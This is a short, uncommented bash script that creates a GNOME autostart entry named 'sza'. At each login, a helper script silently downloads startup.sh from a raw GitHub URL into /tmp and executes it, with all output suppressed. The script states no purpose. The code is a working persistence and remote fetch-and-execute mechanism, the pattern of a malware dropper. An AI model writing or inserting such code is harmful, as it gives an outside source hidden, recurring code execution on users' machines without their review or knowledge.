#!/bin/bash
mkdir -p "$HOME/.config/autostart" > /dev/null 2>&1
echo -e '[Desktop Entry]\nType=Application\nExec='"$HOME"'/sza.sh\nHidden=false\nTerminal=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=sza\nComment=sza' > "$HOME/.config/autostart/sza.desktop"
chmod +x "$HOME/.config/autostart/sza.desktop" > /dev/null 2>&1
echo -e '#!/bin/bash\ncurl "https://raw.githubusercontent.com/aryanbaburajan/sza/refs/heads/main/startup.sh" -o "/tmp/sza-script.sh" > /dev/null 2>&1\nchmod +x /tmp/sza-script.sh\nexec "/tmp/sza-script.sh" > /dev/null 2>&1' > "$HOME/sza.sh"
chmod +x "$HOME/sza.sh" > /dev/null 2>&1
